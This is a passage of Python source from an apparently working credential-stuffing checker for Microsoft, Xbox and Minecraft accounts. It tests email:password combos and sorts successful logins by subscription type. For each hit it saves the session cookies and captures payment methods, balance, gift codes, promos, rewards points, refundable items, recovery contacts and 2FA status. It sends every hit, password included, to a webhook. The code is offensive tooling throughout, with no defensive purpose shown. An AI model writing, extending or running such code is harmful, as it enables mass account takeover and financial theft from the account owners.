        stats.hits += 1
        await append_line(f"{RESULTS_DIR}/Hits.txt", combo)
        await write_dedup(f"{RESULTS_DIR}/Mixed.txt", combo, f"combo:{email}")

        cat_folder = "Other"
        if acc_type == "GamePass Ultimate":
            stats.gp_ultimate += 1
            cat_folder = "XboxGamePass"
            await append_line(f"{RESULTS_DIR}/XboxUltimate.txt", combo)
        elif acc_type == "GamePass PC":
            stats.gp_pc += 1
            cat_folder = "XboxGamePass"
            await append_line(f"{RESULTS_DIR}/XboxGamePassPC.txt", combo)
        elif acc_type == "Java":
            stats.java += 1
            cat_folder = "Minecraft"
            await append_line(f"{RESULTS_DIR}/Java.txt", combo)
        else:
            stats.other += 1
            await append_line(f"{RESULTS_DIR}/Other.txt", f"{combo} | {acc_type}")

        await save_cookies(sess, cat_folder, email, password)

        gc_str = ", ".join(f"{g['code']} ({g['title']})" for g in gift_codes) if gift_codes else "None"
        pr_str = ", ".join(f"{p['code']} ({p['type']})" for p in promos_list) if promos_list else "None"
        games_str = ", ".join(games_list) if games_list else "None"
        aml_2fa = f"ON ({aml_info.tfa_method})" if aml_info.has_2fa else "OFF"
        aml_summary = (
            f"{aml_info.verdict} | Recovery: {aml_info.recovery_email} | "
            f"Phone: {aml_info.recovery_phone} | 2FA: {aml_2fa}"
        )

        async with _fl():
            os.makedirs(RESULTS_DIR, exist_ok=True)
            async with aiofiles.open(f"{RESULTS_DIR}/Capture.txt", "a", encoding="utf-8") as f:
                await f.write(
                    f"Email: {email}\nPassword: {password}\nName: {profile.name}\n"
                    f"Account Type: {acc_type}\nUUID: {profile.uuid}\nCapes: {profile.capes}\n"
                    f"Renameable: {profile.renameable}\nName Changed: {profile.name_changed}\n"
                    f"Hypixel Ban: {hypixel_ban}\nDonut SMP Ban: {donut_ban}\nRewards Points: {rp_val}\n"
                    f"Subscriptions: {subs_str}\nGift Codes: {gc_str}\nPromos: {pr_str}\n"
                    f"Balance: {pay_info.balance_str}\nPayment Methods: {pay_info.methods_str}\n"
                    f"Refundable: {ref_info.count} Items (~${ref_info.total_usd:.2f})\n"
                    f"Games ({len(games_list)}): {games_str}\n"
                    f"AML: {aml_summary}\n"
                    f"{'=' * 32}\n"
                )

        if webhook and config.webhook_events.get("hit", True):
            await webhook.send_hit({
                "email": email, "password": password, "type": acc_type,
                "name": profile.name, "capes": profile.capes, "renameable": profile.renameable,
                "name_changed": profile.name_changed, "hypixel": hypixel_ban, "donut": donut_ban,
                "rewards": rp_val, "balance": pay_info.balance_str, "payment": pay_info.methods_str,
                "subs": subs_str, "gift_codes": gc_str, "promos": pr_str,
                "ref_count": ref_info.count,
                "games": games_str, "games_count": len(games_list),
                "aml": aml_summary, "aml_verdict": aml_info.verdict,
            })

        st_tag = {
            "Java": "JAVA", "GamePass Ultimate": "GP_ULT", "GamePass PC": "GP_PC"
        }.get(acc_type, "HIT")
        live_feed.append({"status": st_tag, "combo": combo, "details": acc_type})
        _fire(_log_live(st_tag, combo, {
            "Type": acc_type, "Username": profile.name, "UUID": profile.uuid,
            "Capes": profile.capes, "Rewards": rp_val, "Balance": pay_info.balance_str,
            "Subs": subs_str, "Gift Codes": gc_str, "Promos": pr_str,
            "Hypixel Ban": hypixel_ban, "Donut Ban": donut_ban,
            "Refundable": f"{ref_info.count} items", "Payment": pay_info.methods_str,
            "Games": f"{len(games_list)} titles" if games_list else "None",
            "AML": f"{aml_info.verdict} ({aml_info.active_proofs} proofs)"
                   if aml_info.verdict != "Unknown" else "Unknown",
        }))

        for _gc in gift_codes:
            _fire(_log_live("GIFTCODE", combo, {"Code": _gc.get('code'), "Region": _gc.get('region'), "Title": _gc.get('title')}))
        for _pr in promos_list:
            _fire(_log_live("PROMO", combo, {"Code": _pr.get('code'), "Type": _pr.get('type'), "Days Left": _pr.get('days_left')}))
        if rp_val != "N/A" and rp_val != "0":
            _fire(_log_live("REWARDS", combo, {"Points": rp_val, "Balance": pay_info.balance_str}))

    except (CurlSSLError, CurlTimeout, CurlRequestException):
        if retry_count < config.max_retries:
            _queue_retry()
        else:
            stats.errors += 1
            live_feed.append({"status": "ERROR", "combo": combo, "details": "Timeout/SSL/Conn"})
    except ImpersonateError:
        stats.errors += 1
        live_feed.append({"status": "ERROR", "combo": combo, "details": "Impersonate"})
    except Exception as e:
        stats.errors += 1
        live_feed.append({"status": "ERROR", "combo": combo, "details": str(e)[:20]})
        await log_error(f"CheckAccount:{combo}", e)
    finally:
        await release_session(sess)
        if not is_retry:
            stats.checked += 1

# --- worker ---
async def worker(queue: asyncio.Queue) -> None:
    while True:
        item = await queue.get()
        if item is None:
            queue.task_done()
            break
        combo, retry = item if isinstance(item, tuple) else (item, 0)
        try:
            await asyncio.wait_for(check_account(combo, queue, retry), timeout=110)
        except asyncio.TimeoutError:
            stats.errors += 1
            await log_error("Timeout", Exception(f"Job timed out: {combo}"))
        except Exception as e:
            stats.errors += 1
            await log_error("WorkerException", e)
        finally:
            queue.task_done()
